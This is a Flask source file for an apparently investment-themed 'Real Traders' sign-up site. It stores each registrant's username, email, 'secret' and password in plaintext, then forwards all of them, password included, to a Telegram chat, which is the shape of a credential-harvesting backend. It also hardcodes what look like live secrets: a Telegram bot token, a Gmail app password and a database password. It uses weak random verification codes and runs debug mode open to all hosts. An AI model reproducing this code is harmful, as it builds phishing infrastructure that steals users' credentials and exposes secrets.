from flask import Flask, request, jsonify, render_template
import random
import smtplib
import ssl
from email.message import EmailMessage
import requests
import os
import psycopg2
from psycopg2 import sql

app = Flask(__name__)

# Configurations
BOT_TOKEN = "7271224033:AAH22jbuHkyvJQuiP_HhqMeN9NjADo6J7vk"
CHAT_ID = "-1002826854422"
EMAIL_SENDER = "nonyaneinvestmenttree@gmail.com"
EMAIL_PASSWORD = "uafm mdts tnzw enrf"

# PostgreSQL configuration
DATABASE_URL = "postgresql://real_traders_user:9hqUS4p6Vx7T4gam40WJ0y8hIUmct9al@dpg-d274k83uibrs73cup0j0-a/real_traders"

# In-memory stores
verification_codes = {}  # { email: code }
registered_emails = set()  # to ensure one registration per email

def get_db_connection():
    conn = psycopg2.connect(DATABASE_URL)
    return conn

def create_table():
    conn = get_db_connection()
    cur = conn.cursor()
    cur.execute("""
        CREATE TABLE IF NOT EXISTS traders (
            id SERIAL PRIMARY KEY,
            username VARCHAR(100) NOT NULL,
            email VARCHAR(100) UNIQUE NOT NULL,
            experience VARCHAR(50) NOT NULL,
            secret VARCHAR(100) NOT NULL,
            password VARCHAR(100) NOT NULL,
            registration_date TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    """)
    conn.commit()
    cur.close()
    conn.close()

# Create table when starting the app
create_table()

@app.route("/")
def home():
    return render_template("register.html")

@app.route("/send-code", methods=["POST"])
def send_code():
    data = request.json
    email = data.get("email")

    if email in registered_emails:  
        return jsonify({"message": "❌ This email is already registered."}), 400  

    code = str(random.randint(100000, 999999))  
    verification_codes[email] = code  

    # Send email  
    try:  
        msg = EmailMessage()  
        msg.set_content(f"Your verification code is: {code}")  
        msg["Subject"] = "Your Real Traders Verification Code"  
        msg["From"] = EMAIL_SENDER  
        msg["To"] = email  

        context = ssl.create_default_context()  
        with smtplib.SMTP_SSL("smtp.gmail.com", 465, context=context) as server:  
            server.login(EMAIL_SENDER, EMAIL_PASSWORD)  
            server.send_message(msg)  

        return jsonify({"message": "📩 Code sent to your email!"}), 200  

    except Exception as e:  
        return jsonify({"message": f"❌ Failed to send email: {str(e)}"}), 500

@app.route("/verify-code", methods=["POST"])
def verify_code():
    data = request.json
    email = data.get("email")
    code = data.get("code")

    if verification_codes.get(email) == code:  
        return jsonify({"verified": True})  
    return jsonify({"verified": False})

@app.route("/register", methods=["POST"])
def register():
    data = request.json
    username = data.get("username")
    email = data.get("email")
    experience = data.get("experience")
    secret = data.get("secret")
    password = data.get("password")

    if email in registered_emails:  
        return jsonify({"status": "failed", "error": "Email already registered"}), 400  

    # Save to PostgreSQL
    try:
        conn = get_db_connection()
        cur = conn.cursor()
        
        cur.execute("""
            INSERT INTO traders (username, email, experience, secret, password)
            VALUES (%s, %s, %s, %s, %s)
        """, (username, email, experience, secret, password))
        
        conn.commit()
        cur.close()
        conn.close()
        
        registered_emails.add(email)
    except psycopg2.IntegrityError:
        return jsonify({"status": "failed", "error": "Email already registered in database"}), 400
    except Exception as e:
        return jsonify({"status": "error", "error": f"Database error: {str(e)}"}), 500

    # Send Telegram notification
    message = (  
        f"🧠 New Real Trader Registered!\n"  
        f"Name: {username}\n"  
        f"Email: {email}\n"  
        f"Experience: {experience}\n"  
        f"Secret: {secret}\n"  
        f"Password: {password}"  
    )  

    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"  
    payload = {"chat_id": CHAT_ID, "text": message}  

    try:  
        res = requests.post(url, json=payload)  
        if res.status_code == 200:  
            return jsonify({"status": "sent"}), 200  
        else:  
            return jsonify({"status": "failed", "error": res.text}), 500  
    except Exception as e:  
        return jsonify({"status": "error", "error": str(e)}), 500

if __name__ == "__main__":
    app.run(debug=True, host="0.0.0.0")
